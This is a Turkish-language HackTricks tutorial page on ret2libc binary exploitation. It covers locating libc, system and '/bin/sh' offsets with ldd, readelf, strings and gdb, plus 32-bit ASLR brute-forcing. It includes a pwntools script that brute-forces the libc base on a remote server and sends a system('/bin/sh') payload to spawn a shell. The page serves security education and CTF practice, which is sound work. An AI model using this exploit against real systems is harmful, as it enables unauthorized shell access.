# Ret2lib

{% hint style="success" %}
AWS Hacking'ı öğrenin ve uygulayın: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitimi AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'ı öğrenin ve uygulayın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitimi GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'ı Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking püf noktalarını paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}

## **Temel Bilgiler**

**Ret2Libc**'nin özü, zayıf bir programın yürütme akışını, saldırgan tarafından sağlanan shellcode'ın yığında yürütülmesi yerine, paylaşılan bir kütüphane içindeki bir işlevine yönlendirmektir (örneğin, **system**, **execve**, **strcpy**). Saldırgan, geri dönüş adresini değiştiren bir yük oluşturur ve yığında istenen kütüphane işlevine işaret ederken, aynı zamanda çağrı konvansiyonuna göre doğru şekilde ayarlanmış herhangi gerekli argümanın da olmasını sağlar.

### **Örnek Adımlar (basitleştirilmiş)**

* Çağrılacak işlevin adresini alın (örneğin, system) ve çağrılacak komutu (örneğin, /bin/sh)
* İlk argümanı komut dizinine işaret edecek şekilde ve yürütme akışını işleve geçirecek şekilde ROP zinciri oluşturun

## Adresleri Bulma

* Kullanılan `libc`'nin mevcut makineden olanın nerede bellekte yükleneceğini aşağıdaki komutla bulabilirsiniz:

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

Eğer ASLR'ın libc adresini değiştirip değiştirmediğini kontrol etmek istiyorsanız şunu yapabilirsiniz:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* Kullanılan libc bilindiğinde, `system` işlevine olan ofseti bulmak da mümkündür:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* Kullanılan libc bilindiğinde, `/bin/sh` dizesinin işlevine olan ofseti bulmak da mümkündür:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### gdb-peda / GEF Kullanımı

Kullanılan libc bilindiğinde, **system** fonksiyonunun, **exit** fonksiyonunun ve **`/bin/sh`** dizesinin adresini almak için Peda veya GEF kullanmak da mümkündür:
```bash
p system
p exit
find "/bin/sh"
```
### /proc/\<PID>/maps Kullanımı

Eğer işlem her seferinde sizinle iletişim kurduğunda (**network server**), o dosyayı **okumaya** çalışın (muhtemelen root olmanız gerekecektir).

Burada işlem içinde **libc'nin tam olarak nerede yüklendiğini** ve işlemin her çocuğu için **nerede yükleneceğini** bulabilirsiniz.

![](<../../../.gitbook/assets/image (853).png>)

Bu durumda **0xb75dc000** adresine yüklendi (Bu, libc'nin taban adresi olacaktır)

## Bilinmeyen libc

Binary'nin yüklediği libc'yi **bilmediğiniz** olabilir (çünkü erişiminiz olmayan bir sunucuda olabilir). Bu durumda, zafiyeti **bazı adresleri sızdırarak ve hangi libc** kütüphanesinin kullanıldığını bulabilirsiniz:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

Ve bunun için bir pwntools şablonunu şurada bulabilirsiniz:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

### 2 ofset ile libc'yi bilmek

[https://libc.blukat.me/](https://libc.blukat.me/) sayfasını kontrol edin ve libc içindeki fonksiyonların **bir çift adresini** kullanarak **kullanılan sürümü** bulun.

## 32 bit ASLR'yi atlatma

Bu kaba kuvvet saldırıları **yalnızca 32 bit sistemler** için kullanışlıdır.

* Saldırı yerel ise, libc'nin taban adresini kaba kuvvetle deneyebilirsiniz (32 bit sistemler için kullanışlıdır):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Uzak bir sunucuyu hedef alıyorsanız, `libc` fonksiyonu `usleep`'in adresini **10** (örneğin) argümanı olarak geçerek **brute-force** yöntemini deneyebilirsiniz. Eğer sunucu cevap vermek için **10 saniye daha fazla zaman alıyorsa**, bu fonksiyonun adresini buldunuz demektir.

## Tek Gadget

Yalnızca **bir** belirli **adrese** atlayarak bir kabuk çalıştırın libc içinde:

{% content-ref url="one-gadget.md" %}
[one-gadget.md](one-gadget.md)
{% endcontent-ref %}

## x86 Ret2lib Kod Örneği

Bu örnekte ASLR brute-force kod içine entegre edilmiş ve zafiyetli ikili dosya uzak bir sunucuda bulunmaktadır:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib Kod Örneği

Örneği kontrol etmek için:

{% content-ref url="../" %}
[..](../)
{% endcontent-ref %}

## ARM64 Ret2lib Örneği

ARM64 durumunda, ret komutu x30 kaydının işaret ettiği yere atlar ve yığın kaydının işaret ettiği yere değil. Bu nedenle biraz daha karmaşıktır.

Ayrıca ARM64'te bir komut, ne yapması gerekiyorsa onu yapar (komutların ortasına atlayıp onları yeni komutlara dönüştürmek mümkün değildir).

Örneği kontrol etmek için:

{% content-ref url="ret2lib-+-printf-leak-arm64.md" %}
[ret2lib-+-printf-leak-arm64.md](ret2lib-+-printf-leak-arm64.md)
{% endcontent-ref %}

## Printf'e Ret

Bu, `printf`/`puts`'ı belirli bir veriyle bir argüman olarak çağırarak işlemdeki bilgileri sızdırmayı sağlar. Örneğin, GOT'taki `puts` adresini bir `puts` çalıştırmasına yerleştirmek, bellekteki `puts` adresini sızdıracaktır.

## Ret2printf

Bu temelde bir `Ret2lib`'i `printf` format dizesi açığına dönüştürmek için `ret2lib`'i kullanarak `printf`'i çağırmak ve sömürmek için değerlerle kullanmaktır (anlamsız gibi görünse de mümkündür):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

## Diğer Örnekler ve Referanslar

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)
* Ret2lib, libc'teki bir işlevin adresine sızıntı verildiğinde, tek bir araç kullanarak
* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 bit, ASLR etkin ancak PIE yok, ilk adım bir taşma oluşturup canary'nin 0x00 baytına kadar doldurmak ve ardından puts'u çağırıp sızdırmaktır. Canary ile puts'un GOT'tan adresini sızdırmak için bir ROP aracı oluşturulur ve ardından `/bin/sh` adresiyle `system('/bin/sh')` çağırmak için bir ROP aracı oluşturulur.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 bit, ASLR etkin, canary yok, ana fonksiyonda bir çocuk fonksiyondan yığın taşması. Puts'u çağırmak için ROP aracı oluşturup GOT'tan puts'un adresini sızdırmak ve ardından bir araç çağırmak.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html)
* 64 bit, pie yok, canary yok, relro yok, nx. Write işlevini kullanarak write'un adresini (libc) sızdırmak ve tek bir araç çağırmak için kullanır.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html)
* Yığın üzerinden canary'yi sızdırmak için bir format dizesi kullanır ve sistem çağrısına (GOT'ta) `/bin/sh` adresiyle birlikte bir taşma oluşturmak için bir aşırı taşma kullanır.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html)
* 32 bit, relro yok, canary yok, nx, pie. Bir kötü dizinlemeyi kötüye kullanarak yığından libc ve heap adreslerini sızdırmak. Bir taşma oluşturmak için bir ROP aracı kullanarak `system('/bin/sh')` çağrısı yapar (bir kontrolü atlamak için heap adresine ihtiyaç vardır).
